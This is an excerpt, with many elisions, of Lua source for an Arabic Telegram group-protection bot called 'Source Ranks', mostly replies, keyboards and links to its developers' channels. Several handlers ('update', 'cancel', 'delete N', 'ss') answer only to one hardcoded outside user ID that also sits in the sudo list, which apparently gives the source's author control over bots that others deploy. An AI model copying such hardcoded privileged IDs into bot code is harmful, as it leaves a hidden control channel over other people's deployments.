...
chsource = Redis:get(Fast..'chsource') or "crvso"
devsource = Redis:get(Fast..'devsource') or "HH_VE"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,5961581438,1260465030}
...
xname =  (Redis:get(Fast.."Name:Bot") or "رانكس") 
...
if text == 'كانسل' and tonumber(senderr) == tonumber(5961581438) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(5961581438) then
...
if tonumber(senderr) == 5961581438 then
...
local TestText = "  ❲ 𓂄≠𓆩𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆𓆪≠𓂁 ❳\nᥫ᭡\n ≠︙*ժᥱ᥎ ꪀᥲ️ꪔᥱ* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n≠︙*ժᥱ᥎ ႦᎥ᥆* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = ' ⌯ ˹𝘿𝙚𝙫˼◜ ‌ᯓَِ𝙈َِ𝘼َِ𝙉َِO ⃝⃤≠ꫝ مـــٰٰٰ๋ٖٖٖۧ͜ــ۫͜ـ๋๋͜͜͡‏ـــانو ◞', url = "https://t.mU_g9"}
},
}
...
keyboardd.inline_keyboard = {
{
{text = '❲ 𓂄≠𓆩𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆𓆪≠𓂁 ❳', url = "https://t.me/UU_g9"}
},
{
{text = '❲ ⁨𓂄≠𓆩𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆𓆪≠𓂁 ❳', url = "https://t.me/crvso"},
},
}
local msg_id = msg.id/2097152/0.5 
...
keyboardd.inline_keyboard = {
{
{text = '❲ المبرمج رانكس ❳', url = "https://t.me/Y_U_A_R"}
},
{
{text = '❲ ⁨𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆 ❳', url = "https://t.me/crvso"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
if text == 'عبود' or text == 'حام' then  
local UserId_Info = bot.searchPublicChat("HH_VE")
if UserId_Info.id then
local  ban = bot.getUser(UserId_Info.id)
local  bain = bot.getUserFullInfo(UserId_Info.id)
if  bain.bio then
...
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  ❲ َِ ََِِ⁨◜ ◜𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆◞◞˼⁩ ,❳\nᥫ᭡\n ≠ *ժᥱ᥎ ꪀᥲ️ꪔᥱ* :  [".. ban.first_name.."](tg://user?id="..UserId_Info.id..")\n≠  *ժᥱ᥎ ႦᎥ᥆* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = 'ِ𝙙𝙀𝙑 𝙨𝙀𝙈𝙤  .', url = 't.me/HH_VE'}, 
},
}
local msg_id = msg.id/2097152/0.5 
 https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(5961581438) then
...
local Bot_Name = (Redis:get(Fast.."Name:Bot") or "رانكس")
if text then
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(5961581438) then
local txx = "\n"
...
data = {
{
{text = '◜𝘾𝙝 • سورس رانكس •◞', url = 'http://t.me/'..chsource..''}, 
},
{
...
⌯━─━─𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆─━─━⌯
𝁂𝙬𝙀𝙡𝘾𝙤𝙈𝙀 𝙏𝙤 𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆 𝁂
𝁂 𝙈𝘼𝙆𝙀𝙍     :[𝙈𝘼𝙆𝙀𝙍 𝑅𝐴𝑁𝐾𝑆⋮](https://t.me/RANKS_BOT) 𝁂
⌯━─━─𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆─━─━⌯
...
if text == (Redis:get(Fast.."Name:Bot") or "رانكس") then
if Redis:get(Fast.."name bot type : ") == "photo" then
  ...
  if photo.total_count > 0 then
    local NamesBot = (Redis:get(Fast.."Name:Bot") or "رانكس")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
"ثانيه واحده بسلك رقم واحده",
"انا مش فاضي رانكس مكاني اهو",
...
local photo = bot.getUserProfilePhotos(Fast)
local CmdStart = '*\n≠ أهلآ بك في بوت '..(Redis:get(Fast.."Name:Bot") or "رانكس")..
'\n≠⋮ اختصاص البوت حماية المجموعات'..
'\n≠⋮ لتفعيل البوت عليك اتباع مايلي ...'..
'\n≠⋮ اضف البوت الى مجموعتك'..
'\n≠⋮ ارفعه ادمن مشرف'..
'\n≠⋮ ارسل كلمة { تفعيل } ليتم تفعيل المجموعه'..
'\n≠⋮ ارسل كلمة { /Ranks} لاظهار الكيبورد'..
'\n≠⋮ مطور البوت -›«@'..UserSudo..'»*'
...
{
{text = '◜ • سورس رانكس •◞', url = 't.me/'..chsource..''}, 
},
}
}
...
return send(msg_chat_id,msg_id,'≠ اهلا عزيزي المطور الاساسي إلىك التحكم في الازار في الاسفل ', 'md', false, false, false, false, reply_markup)
end
end
if text == '/Ranks' or text == 'عوده' or text == 'رجـوع ≠' then  
Redis:sadd(Fast..'Num:User:Pv',msg.sender_id.user_id)  
if not msg.Asasy then 
if not Redis:get(Fast.."Start:Bot") then
local CmdStart = '*\n ≠ ⋮ أهلا بك في بوت '..(Redis:get(Fast.."Name:Bot") or "رانكس")..
...
data = {
{
{text = '« عبود»',type = 'text'},{text = '«سورس»', type = 'text'},
},
{
{text = '«الغاء الامر»',type = 'text'},
},
...
if text == "غنيلي ≠" then
local t = "إلىك اغنيه عشوائيه من البوت"
...
if text == 'مبرمج السورس ≠' or text == 'مبرمج السورس' or text == 'عبود' then  
local UserId_Info = bot.searchPublicChat("HH_VE")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
local InfoUser = bot.getUserFullInfo(UserId_Info.id)
...
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  ❲ ◜𝑆𝑂𝑈𝑅𝐶𝐸 𝑅𝐴𝑁𝐾𝑆◞ ❳\nᥫ᭡\n ≠︙*ժᥱ᥎ ꪀᥲ️ꪔᥱ* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n≠︙*ժᥱ᥎ ႦᎥ᥆* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '❲ ِ𝙙𝙀𝙑 ❳', url = "https://t.me/HH_VE"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
keyboardd.inline_keyboard = {
{
{text = ' المبرمج عبود ', url = "https://t.me/HH_VE"}
},
{
{text = '◜المبرمج محمد◞', url = "https://t.me/PPF22"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
"لو خيروك -›  بين مرانكسة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ ",
} 
return bot.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
